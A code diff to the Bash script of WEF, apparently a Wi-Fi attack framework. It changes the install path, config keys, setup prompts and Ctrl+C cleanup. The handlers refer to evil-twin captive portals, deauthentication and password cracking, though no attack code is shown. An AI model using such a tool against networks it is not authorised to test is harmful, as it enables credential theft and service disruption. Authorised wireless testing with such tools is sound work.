@@ -51,35 +51,36 @@ function check_dependencies(){
 
 function run_setup(){
   color_output "*" "Installing wef..."
-  sleep 0.1
+  sleep 0.2
 
-  mkdir /opt/wef \
-  /opt/wef/cache \
-  /opt/wef/main \
-  /opt/wef/main/captures \
-  /opt/wef/main/logs \
-  /opt/wef/main/graphs 2>/dev/null
+  mkdir /usr/share/wef \
+  /usr/share/wef/cache \
+  /usr/share/wef/main \
+  /usr/share/wef/main/captures \
+  /usr/share/wef/main/logs \
+  /usr/share/wef/main/graphs \
+  /usr/share/wef/main/pwnagotchi 2>/dev/null
   sleep 0.1
 
   # Download captive portals if they are not already on current directory
   if [ -d ".git" ] && [ -d "captive-portals" ]; then
-    cp -r captive-portals/ /opt/wef/main/ 2>/dev/null
+    cp -r captive-portals/ /usr/share/wef/main/ 2>/dev/null
   elif [ ! -d "captive-portals" ]; then
     curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null
     unzip WEF-main.zip &>/dev/null
     rm WEF-main.zip 2>/dev/null
     downloaded="true"
 
-    cp -r WEF-main/captive-portals/ /opt/wef/main/ 2>/dev/null
+    cp -r WEF-main/captive-portals/ /usr/share/wef/main/ 2>/dev/null
   fi
 
   sleep 0.1
 
   # Download wordlists if they are not already on current directory
   if [ -d ".git" ] && [ -d "wordlists" ]; then
-    cp -r wordlists/ /opt/wef/main/ 2>/dev/null
-    gunzip /opt/wef/main/wordlists/rockyou.txt.gz 2>/dev/null
-  elif [ ! -d "captive-portals" ]; then
+    cp -r wordlists/ /usr/share/wef/main/ 2>/dev/null
+    gunzip /usr/share/wef/main/wordlists/rockyou.txt.gz 2>/dev/null
+  elif [ ! -d "wordlists" ]; then
     if [ "$downloaded" != "true" ]; then
       curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null
       unzip WEF-main.zip &>/dev/null
@@ -87,15 +88,15 @@ function run_setup(){
       downloaded="true"
     fi
 
-    cp -r WEF-main/wordlists/ /opt/wef/main/ 2>/dev/null
-    gunzip /opt/wef/main/wordlists/rockyou.txt.gz 2>/dev/null
+    cp -r WEF-main/wordlists/ /usr/share/wef/main/ 2>/dev/null
+    gunzip /usr/share/wef/main/wordlists/rockyou.txt.gz 2>/dev/null
   fi
 
   sleep 0.1
 
   if [ -d ".git" ] && [ -f "wef" ]; then
-    cp wef /opt/wef/wef
-    cp src/mac-vendors.json /opt/wef/mac-vendors.json 2>/dev/null
+    cp wef /usr/share/wef/wef
+    cp src/vendors.json /usr/share/wef/vendors.json 2>/dev/null
   elif [ ! -f "wef" ]; then
     if [ "$downloaded" != "true" ]; then
       curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null
@@ -104,25 +105,25 @@ function run_setup(){
       downloaded="true"
     fi
     
-    cp WEF-main/wef /opt/wef/wef 2>/dev/null
-    cp WEF-main/mac-vendors.json /opt/wef/mac-vendors.json 2>/dev/null
+    cp WEF-main/wef /usr/share/wef/wef 2>/dev/null
+    cp WEF-main/vendors.json /usr/share/wef/vendors.json 2>/dev/null
   fi
 
   sleep 0.1
 
-  ln -s /opt/wef/wef /usr/bin/wef 2>/dev/null
-  chmod +x /opt/wef/wef /usr/bin/wef 2>/dev/null  
+  ln -s /usr/share/wef/wef /usr/bin/wef 2>/dev/null
+  chmod +x /usr/share/wef/wef /usr/bin/wef 2>/dev/null  
 
   if [ "$downloaded" == "true" ]; then
     rm -rf WEF-main 2>/dev/null
   fi
 
-  # Check if the wef config file exists in /opt/wef/
-  if [ ! -f "/opt/wef/wef.cnf" ]; then
-    echo -e "${blueC}[${yC}*${blueC}] Creating config file (/opt/wef/wef.cnf)${endC}"
+  # Check if the wef config file exists in /usr/share/wef/
+  if [ ! -f "/usr/share/wef/wef.cnf" ]; then
+    echo -e "${blueC}[${yC}*${blueC}] Creating config file /usr/share/wef/wef.cnf${endC}"
 
     echo "# This is default config file
-# This file must be saved as /opt/wef/wef.cnf
+# This file must be saved as /usr/share/wef/wef.cnf
 # Then you can edit it to make it much more flexible and to adapt to your requirements
 
 # Default lenguage to use. Values: en, es
@@ -132,37 +133,53 @@ lang=en
 use_colors=true
 
 # Enable/disable verbose by default (recommended to be enabled)
-verbose=true" >> /opt/wef/wef.cnf
+verbose=true" >> /usr/share/wef/wef.cnf
   fi
 
   color_output_ln "*" "WEF successfully installed on path, execute ${yC}wef${endC}"
 }
 
 function run_update(){
-  rm /usr/bin/wef /opt/wef/wef 2>/dev/null
+  rm /usr/bin/wef /usr/share/wef/wef 2>/dev/null
 
   run_setup &>/dev/null
 }
 
 function parse_config(){
+  verbose=$(awk -F "=" '/verbose/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " " | sed '/^$/d')
+  frequency_band=$(awk -F "=" '/frequency_band/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
+  auto_enable_monitor=$(awk -F "=" '/auto_enable_monitor/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
+  create_graph=$(awk -F "=" '/create_graph/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
+  scan_on_each_attack=$(awk -F "=" '/scan_on_each_attack/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
+  airmon_check_kill=$(awk -F '=' '/airmon_check_kill/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
+  identify_devices=$(awk -F "=" '/identify_devices/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
+
+  if [ ! "$verbose" ] || [ ! "$frequency_band" ] || [ ! "$auto_enable_monitor" ] || [ ! "$create_graph" ] || [ ! "$scan_on_each_attack" ] || [ ! "$airmon_check_kill" ] | [ ! "$identify_devices" ]; then
+
+    if [ "$lang" == "en" ]; then
+      echo -e "\n${grayC}This is the first time you run wef, let's change some configuration parameters. You can make changes later this by editing /usr/share/wef/wef.cnf${endC}"
+    else
+      echo -e "\n${grayC}Esta es la primera vez que usas wef, vamos a cambiar algunos parámetros de la configuración. Puedes hacer cambios más tarde editando /usr/share/wef/wef.cnf${endC}"
+    fi
+  fi
+
   # If config has verbose enabled it will be used by default without the --verbose parameter
-  verbose=$(awk -F "=" '/verbose/ {print $2}' /opt/wef/wef.cnf | sed 's/#.*//' | tr -d " " | sed '/^$/d')
   if [ ! "$verbose" ]; then
     while true; do
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "Do you want to enable verbose by default? Can be changed later in /opt/wef/wef.cnf [${yC}y${blueC}/${yC}n${blueC}]: " && read verbose_option
+        color_output_no_line "*" "Do you want to enable verbose by default? (${yC}yes${blueC}/${yC}no${blueC}): " && read verbose_option
       else
-        color_output_no_line "*" "¿Quieres activar por defecto el verbose? Se puede cambiar mas tarde en /opt/wef/wef.cnf [${yC}s${blueC}/${yC}n${blueC}]: " && read verbose_option
+        color_output_no_line "*" "¿Quieres activar por defecto el verbose? (${yC}si${blueC}/${yC}no${blueC}): " && read verbose_option
       fi
 
       if [ "$verbose_option" == "y" ] || [ "$verbose_option" == "yes" ] || [ "$verbose_option" == "s" ] || [ "$verbose_option" == "si" ]; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "verbose=")"
-        echo -e "${content}# Enable/disable verbose by default (recommended to be enabled)\nverbose=true" > /opt/wef/wef.cnf
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "verbose=")"
+        echo -e "${content}# Enable/disable verbose by default (recommended to be enabled)\nverbose=true" > /usr/share/wef/wef.cnf
         verbose="true"
         break
       elif [ "$verbose_option" == "n" ] || [ "$verbose_option" == "no" ] ; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "verbose=")"
-        echo -e "${content}# Enable/disable verbose by default (recommended to be enabled)\nverbose=false" > /opt/wef/wef.cnf
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "verbose=")"
+        echo -e "${content}# Enable/disable verbose by default (recommended to be enabled)\nverbose=false" > /usr/share/wef/wef.cnf
         verbose="false"
         break
       fi
@@ -170,62 +187,60 @@ function parse_config(){
   fi
 
   # Config wifi band in which to scan APs
-  frecuency_band=$(awk -F "=" '/frecuency_band/ {print $2}' /opt/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
-  if [ ! "$frecuency_band" ]; then
+  if [ ! "$frequency_band" ]; then
     while true; do
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "Do you want to scan nearby access points on 2.4GHz, 5GHz or autodetect? You can change this later in /opt/wef/wef.cnf [${yC}2.4${blueC}/${yC}5${blueC}/${yC}auto${blueC}]: " && read scan_option
+        color_output_no_line "*" "Do you want to scan nearby access points on 2.4GHz, 5GHz or autodetect? (${yC}2.4${blueC}/${yC}5${blueC}/${yC}auto${blueC}) (default=auto): " && read scan_option
       else
-        color_output_no_line "*" "¿Quieres escanear los puntos de acceso cercano en 2.4GHz, 5GHz o detectar automáticamente? Puedes cambiarlo mas tarde en /opt/wef/wef.cnf [${yC}2.4${blueC}/${yC}5${blueC}/${yC}auto${blueC}]: " && read scan_option
+        color_output_no_line "*" "¿Quieres escanear los puntos de acceso cercano en 2.4GHz, 5GHz o detectar automáticamente? (${yC}2.4${blueC}/${yC}5${blueC}/${yC}auto${blueC}) (por defecto=auto): " && read scan_option
       fi
 
       if [ "$scan_option" == "2" ] || [ "$scan_option" == "2.4" ]; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "frecuency_band=")"
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "frequency_band=")"
         echo -e "${content}\n
 # Wifi band in which to scan access points. Values: 2.4, 5, auto
-frecuency_band=2.4" > /opt/wef/wef.cnf
-        frecuency_band="2.4"
+frequency_band=2.4" > /usr/share/wef/wef.cnf
+        frequency_band="2.4"
         break
       elif [ "$scan_option" == "5" ] ; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "frecuency_band=")"
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "frequency_band=")"
         echo -e "${content}\n
 # Wifi band in which to scan access points. Values: 2.4, 5, auto
-frecuency_band=5" > /opt/wef/wef.cnf
-        frecuency_band="5"
+frequency_band=5" > /usr/share/wef/wef.cnf
+        frequency_band="5"
         break
-      elif [ "$scan_option" == "auto" ] || [ "$scan_option" == "autodetect" ]; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "frecuency_band=")"
+      elif [ "$scan_option" == "auto" ] || [ "$scan_option" == "autodetect" ] || [ ! "$scan_option" ]; then
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "frequency_band=")"
         echo -e "${content}\n
 # Wifi band in which to scan access points. Values: 2.4, 5, auto
-frecuency_band=auto" > /opt/wef/wef.cnf
-        frecuency_band="auto"
+frequency_band=auto" > /usr/share/wef/wef.cnf
+        frequency_band="auto"
         break
       fi
     done
   fi
 
   # enable monitor mode at launch if it is set by default
-  auto_enable_monitor=$(awk -F "=" '/auto_enable_monitor/ {print $2}' /opt/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
   if [ ! "$auto_enable_monitor" ]; then
     while true; do
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "Do you want to enable monitor mode on each launch by default? Can be changed later in /opt/wef/wef.cnf [${yC}y${blueC}/${yC}n${blueC}]: " && read automon_option
+        color_output_no_line "*" "Do you want to enable monitor mode on each launch by default? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read automon_option
       else
-        color_output_no_line "*" "¿Quieres activar por defecto el modo monitor en cada arranque? Se puede cambiar mas tarde en /opt/wef/wef.cnf [${yC}s${blueC}/${yC}n${blueC}]: " && read automon_option
+        color_output_no_line "*" "¿Quieres activar por defecto el modo monitor en cada arranque? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read automon_option
       fi
 
-      if [ "$automon_option" == "y" ] || [ "$automon_option" == "yes" ] || [ "$automon_option" == "s" ] || [ "$automon_option" == "si" ]; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "auto_enable_monitor=")"
+      if [ "$automon_option" == "y" ] || [ "$automon_option" == "yes" ] || [ "$automon_option" == "s" ] || [ "$automon_option" == "si" ] || [ ! "$automon_option" ]; then
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "auto_enable_monitor=")"
         echo -e "${content}\n
 # Automatically enable monitor mode during launch
-auto_enable_monitor=true" > /opt/wef/wef.cnf
+auto_enable_monitor=true" > /usr/share/wef/wef.cnf
         auto_enable_monitor="true"
         break
       elif [ "$automon_option" == "n" ] || [ "$automon_option" == "no" ] ; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "auto_enable_monitor=")"
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "auto_enable_monitor=")"
         echo -e "${content}\n
 # Automatically enable monitor mode during launch
-auto_enable_monitor=false" > /opt/wef/wef.cnf
+auto_enable_monitor=false" > /usr/share/wef/wef.cnf
         auto_enable_monitor="false"
         break
       fi
@@ -233,54 +248,52 @@ auto_enable_monitor=false" > /opt/wef/wef.cnf
   fi
 
   # Detect auto graph creation
-  create_graph=$(awk -F "=" '/create_graph/ {print $2}' /opt/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
   if [ ! "$create_graph" ]; then
     while true; do
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "Do you want to create a graph (using airgraph-ng) on each scan? Can be changed later in /opt/wef/wef.cnf [${yC}y${blueC}/${yC}n${blueC}]: " && read graph_option
+        color_output_no_line "*" "Do you want to create a graph (using airgraph-ng) on each scan? (${yC}yes${blueC}/${yC}no${blueC}) (default=no): " && read graph_option
       else
-        color_output_no_line "*" "¿Quieres crear un gráfico (usando airgraph-ng) en cada escaneo? Se puede cambiar mas tarde en /opt/wef/wef.cnf [${yC}s${blueC}/${yC}n${blueC}]: " && read graph_option
+        color_output_no_line "*" "¿Quieres crear un gráfico (usando airgraph-ng) en cada escaneo? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=no): " && read graph_option
       fi
 
       if [ "$graph_option" == "y" ] || [ "$graph_option" == "yes" ] || [ "$graph_option" == "s" ] || [ "$graph_option" == "si" ]; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "create_graph=")"
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "create_graph=")"
         echo -e "${content}\n
 # Create a graph of every single scan you perform using airgraph-ng to see target devices and AP info
-create_graph=true" > /opt/wef/wef.cnf
+create_graph=true" > /usr/share/wef/wef.cnf
         create_graph="true"
         break
-      elif [ "$graph_option" == "n" ] || [ "$graph_option" == "no" ] ; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "create_graph=")"
+      elif [ "$graph_option" == "n" ] || [ "$graph_option" == "no" ] || [ ! "$graph_option" ]; then
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "create_graph=")"
         echo -e "${content}\n
 # Create a graph of every single scan you perform using airgraph-ng to see target devices and AP info
-create_graph=false" > /opt/wef/wef.cnf
+create_graph=false" > /usr/share/wef/wef.cnf
         create_graph="false"
         break
       fi
     done
   fi
 
-  scan_on_each_attack=$(awk -F "=" '/scan_on_each_attack/ {print $2}' /opt/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
   if [ ! "$scan_on_each_attack" ]; then
     while true; do
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "Do you want to scan APs on each attack? Can be changed later in /opt/wef/wef.cnf [${yC}y${blueC}/${yC}n${blueC}]: " && read scan_option
+        color_output_no_line "*" "Do you want to scan APs on each attack? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read scan_aps_option
       else
-        color_output_no_line "*" "¿Quieres escanear APs en cada ataque? Se puede cambiar mas tarde en /opt/wef/wef.cnf [${yC}s${blueC}/${yC}n${blueC}]: " && read scan_option
+        color_output_no_line "*" "¿Quieres escanear APs en cada ataque? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read scan_aps_option
       fi
 
-      if [ "$scan_option" == "y" ] || [ "$scan_option" == "yes" ] || [ "$scan_option" == "s" ] || [ "$scan_option" == "si" ]; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "scan_on_each_attack=")"
+      if [ "$scan_aps_option" == "y" ] || [ "$scan_aps_option" == "yes" ] || [ "$scan_aps_option" == "s" ] || [ "$scan_aps_option" == "si" ] || [ ! "$scan_aps_option" ]; then
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "scan_on_each_attack=")"
         echo -e "${content}\n
 # Scan nearby access points each time you decide to perform an attack
-scan_on_each_attack=true" > /opt/wef/wef.cnf
+scan_on_each_attack=true" > /usr/share/wef/wef.cnf
         scan_on_each_attack="true"
         break
-      elif [ "$scan_conf" == "n" ] || [ "$scan_conf" == "no" ]; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "scan_on_each_attack=")"
+      elif [ "$scan_aps_option" == "n" ] || [ "$scan_aps_option" == "no" ]; then
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "scan_on_each_attack=")"
         echo -e "${content}\n
 # Scan nearby access points each time you decide to perform an attack
-scan_on_each_attack=false" > /opt/wef/wef.cnf
+scan_on_each_attack=false" > /usr/share/wef/wef.cnf
         scan_on_each_attack="false"
         break
       fi
@@ -288,59 +301,58 @@ scan_on_each_attack=false" > /opt/wef/wef.cnf
   fi
 
   # Config 'airmon check kill' which is useful for headless use and other things
-  kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
-  if [ ! "$kill_network_services" ]; then
+  if [ ! "$airmon_check_kill" ]; then
     while true; do
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "Do you want to execute \"airmon-ng check kill\" when enabling monitor mode? This will stop your active network connections! Can be changed later in /opt/wef/wef.cnf [${yC}y${blueC}/${yC}n${blueC}]: " && read kns_option
+        color_output_no_line "*" "Do you want to execute \"airmon-ng check kill\" when enabling monitor mode? This will stop your active network connections so set it to \"no\" when using on headless setup. (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read kns_option
       else
-        color_output_no_line "*" "¿Quieres ejecutar \"airmon-ng check kill\" al activar el modo monitor? ¡Esto cortará tus conexiones activas! Se puede cambiar mas tarde en /opt/wef/wef.cnf [${yC}s${blueC}/${yC}n${blueC}]: " && read kns_option
+        color_output_no_line "*" "¿Quieres ejecutar \"airmon-ng check kill\" al activar el modo monitor? Esto cortará tus conexiones activas asi que elige \"no\" al usar un setup headless. (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read kns_option
       fi
 
-      if [ "$kns_option" == "y" ] || [ "$kns_option" == "yes" ] || [ "$kns_option" == "s" ] || [ "$kns_option" == "si" ]; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "airmon_check_kill=")"
+      if [ "$kns_option" == "y" ] || [ "$kns_option" == "yes" ] || [ "$kns_option" == "s" ] || [ "$kns_option" == "si" ] || [ ! "$kns_option" ]; then
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "airmon_check_kill=")"
         echo -e "${content}\n
 # Execute 'airmon check kill' when you enable monitor mode (disable it on headless device)
-airmon_check_kill=true" > /opt/wef/wef.cnf
-        kill_network_services="true"
+airmon_check_kill=true" > /usr/share/wef/wef.cnf
+        airmon_check_kill="true"
         break
       elif [ "$kns_option" == "n" ] || [ "$kns_option" == "no" ] ; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "airmon_check_kill=")"
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "airmon_check_kill=")"
         echo -e "${content}\n
 # Execute 'airmon check kill' when you enable monitor mode (disable it on headless device)
-airmon_check_kill=false" > /opt/wef/wef.cnf
-        kill_network_services="false"
+airmon_check_kill=false" > /usr/share/wef/wef.cnf
+        airmon_check_kill="false"
         break
       fi
     done
   fi
 
-  identify_devices=$(awk -F "=" '/identify_devices/ {print $2}' /opt/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
   if [ ! "$identify_devices" ]; then
     while true; do
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "Do you want to identify vendor of discovered stations (based on a database)? Can be changed later in /opt/wef/wef.cnf [${yC}y${blueC}/${yC}n${blueC}]: " && read identify_option
+        color_output_no_line "*" "Do you want to identify vendor of discovered stations (based on a database)? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read identify_option
       else
-        color_output_no_line "*" "¿Quieres identificar el vendor de las estaciones descubiertas (basado en una base de datos)? Se puede cambiar mas tarde en /opt/wef/wef.cnf [${yC}s${blueC}/${yC}n${blueC}]: " && read identify_option
+        color_output_no_line "*" "¿Quieres identificar el vendor de las estaciones descubiertas (basado en una base de datos)? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read identify_option
       fi
 
-      if [ "$identify_option" == "y" ] || [ "$identify_option" == "yes" ] || [ "$identify_option" == "s" ] || [ "$identify_option" == "si" ]; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "identify_devices=")"
+      if [ "$identify_option" == "y" ] || [ "$identify_option" == "yes" ] || [ "$identify_option" == "s" ] || [ "$identify_option" == "si" ] || [ ! "$identify_option" ]; then
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "identify_devices=")"
         echo -e "${content}\n
 # Identify vendor of each nearby device found, based on a database (i.e. TP-LINK)
-identify_devices=true" > /opt/wef/wef.cnf
+identify_devices=true" > /usr/share/wef/wef.cnf
         identify_devices="true"
         break
       elif [ "$identify_option" == "n" ] || [ "$identify_option" == "no" ] ; then
-        content="$(cat /opt/wef/wef.cnf | grep -v "identify_devices=")"
+        content="$(cat /usr/share/wef/wef.cnf | grep -v "identify_devices=")"
         echo -e "${content}\n
 # Identify vendor of each nearby device found, based on a database (i.e. TP-LINK)
-identify_devices=false" > /opt/wef/wef.cnf
+identify_devices=false" > /usr/share/wef/wef.cnf
         identify_devices="false"
         break
       fi
     done
   fi
+  sleep 1
 }
 
 
@@ -348,14 +360,14 @@ identify_devices=false" > /opt/wef/wef.cnf
 # Functions used to catch Ctrl+C sigterm, to remove temporal files and to revert interface changes
 #
 
-# Ctrl + C
+# Ctrl+C
 function ctrl_c(){
   if [ "$(check_interface_mode)" == "monitor" ]; then
     while true; do
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "Do you want to disable monitor mode? (default=yes) [${yC}y${blueC}/${yC}n${blueC}]: " && read disable_opt
+        color_output_no_line "*" "Do you want to disable monitor mode? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read disable_opt
       else
-        color_output_no_line "*" "¿Quieres desactivar el modo monitor? (por defecto=si) [${yC}s${blueC}/${yC}n${blueC}]: " && read disable_opt
+        color_output_no_line "*" "¿Quieres desactivar el modo monitor? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read disable_opt
       fi
 
       if [ "$disable_opt" == "y" ] || [ "$disable_opt" == "yes" ] || [ "$disable_opt" == "s" ] || [ "$disable_opt" == "si" ] || [ ! "$disable_opt" ]; then
@@ -377,21 +389,24 @@ function ctrl_c(){
 
   kill_processes
 
-  wpa_process="$(ps -faux | grep "wpa_supplicant")"
-  if [ ! "${wpa_process}" ]; then
-    if [ "$lang" == "en" ]; then
-      color_output "*" "Restarting connections"
-    else
-      color_output "*" "Restableciendo conexiones"
-    fi
+  #wpa_process="$(ps -faux | grep "wpa_supplicant")"
+  #net_process="$(ps -faux | grep "NetworkManager")"
 
-    systemctl restart wpa_supplicant 2>/dev/null
+  #if [ ! "${wpa_process}" ] || [ ! "${net_process}" ]; then
+    #if [ "$lang" == "en" ]; then
+      #color_output "*" "Restarting connections"
+    #else
+      #color_output "*" "Restableciendo conexiones"
+    #fi
+  #fi
 
-    net_process="$(ps -faux | gre "NetworkManager")"
-    if [ ! "${net_process}" ]; then
-      systemctl restart NetworkManager 2>/dev/null
-    fi
-  fi
+  #if [ ! "${wpa_process}" ]; then
+  systemctl restart wpa_supplicant 2>/dev/null
+  #fi
+
+  #if [ ! "${net_process}" ]; then
+  systemctl restart NetworkManager 2>/dev/null
+  #fi
 
   if [ "$lang" == "en" ]; then
     color_output "!" "Exiting..."
@@ -401,13 +416,13 @@ function ctrl_c(){
 
   # Remove files created during the attacks
   rm hostapd-wpe.log 2>/dev/null
-  rm /opt/wef/cache/eviltwin_attempts.txt 2>/dev/null
+  rm /usr/share/wef/cache/eviltwin_attempts.txt 2>/dev/null
   rm -rf /tmp/www 2>/dev/null
 
   exit 0
 }
 
-# Ctrl + C for EvilTwin attack
+# Ctrl+C for EvilTwin attack
 function evil_twin_c(){
   # Kill created processes
   if [ "$lang" == "en" ]; then
@@ -416,7 +431,6 @@ function evil_twin_c(){
     color_output_ln "!" "Parando procesos..."
   fi
 
-  rm /opt/wef/cache/eviltwin_attempts.txt 2>/dev/null
   killall dhcp &>/dev/null
   kill_processes
   systemctl restart systemd-resolved &>/dev/null
@@ -435,12 +449,12 @@ function wash_c(){
   kill -9 ${wash_PID} 2>/dev/null; wait ${wash_PID} 2>/dev/null
 }
 
-# Ctrl + C for cracking processes
+# Ctrl+C for cracking processes
 function crack_c(){
   killall hashcat john aircrack-ng 2>/dev/null
 }
 
-# Ctrl + C for inhibition function
+# Ctrl+C for inhibition function
 function inhibition_c(){
   # Kill deauth process
   killall aireplay-ng 2>/dev/null
@@ -448,17 +462,17 @@ function inhibition_c(){
 
 function keep_exit(){
   if [ "$lang" == "en" ]; then
-    echo -ne "${blueC}[${yC}*${blueC}] Do you want to exit from tool (${yC}y${blueC}) or going back to main menu (${yC}n${blueC})? : ${endC}" && read exit_status
+    echo -ne "${blueC}[${yC}*${blueC}] Do you want to exit the tool (${yC}yes${blueC}/${yC}no${blueC})? If not, you will return to main menu: ${endC}" && read exit_status
   else
-    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres salir de la herramienta (${yC}s${blueC}) o volver al menu (${yC}n${blueC})? : ${endC}" && read exit_status
+    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres salir de la herramienta (${yC}si${blueC}/${yC}no${blueC})? Al elegir \"no\", volverás al menú principal: ${endC}" && read exit_status
   fi
 
   ctrl_c_pressed="true"
 
-  # If input is y or yes exit from the function
+  # If input is y or yes exit the function
   if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
     ctrl_c
-  elif [ "$exit_status" != "n" ] && [ "$exit_status" != "no" ]; then
+  elif [ "$exit_status" != "n" ] && [ "$exit_status" != "no" ] || [ ! "$exit_status" ]; then
     keep_exit
   fi
 }
@@ -467,12 +481,12 @@ function keep_exit_c(){
   kill_processes
 
   if [ "$lang" == "en" ]; then
-    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit from tool? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
+    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit the tool? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): ${endC}" && read exit_status
   else
-    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
+    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): ${endC}" && read exit_status
   fi
 
-  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
+  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ] || [ ! "${exit_status}" ]; then
     ctrl_c
   elif [ "$exit_status" == "n" ] || [ "$exit_status" == "no" ]; then
     if [[ $input == 1 ]]; then
@@ -483,15 +497,34 @@ function keep_exit_c(){
   fi
 }
 
+function keep_exit_pwnagotchi(){
+  if [ "$lang" == "en" ]; then
+    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit the tool? If not you will return to main menu (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read exit_status
+  else
+    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? Si no volverás al menú principal (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read exit_status
+  fi
+
+  sleep 3
+
+  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
+    exit_from_tool="true"
+  elif [ "$exit_status" == "no" ] || [ "$exit_status" == "n" ]; then
+    exit_from_tool="false"
+  else  
+    keep_exit_pwnagotchi
+  fi
+}
+
 function keep_exit_eviltwin(){
   if [ "$lang" == "en" ]; then
-    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit from tool? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
+    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit the tool? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read exit_status
   else
-    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
+    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read exit_status
   fi
 
   if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
     evil_twin_c
+    killall hostapd hostapd-wpe dnsmasq lighttpd &>/dev/null
     exit 0
   elif [ "$exit_status" != "n" ] && [ "$exit_status" != "no" ]; then
     keep_exit_eviltwin
@@ -554,7 +587,7 @@ function kill_processes(){
 #
 
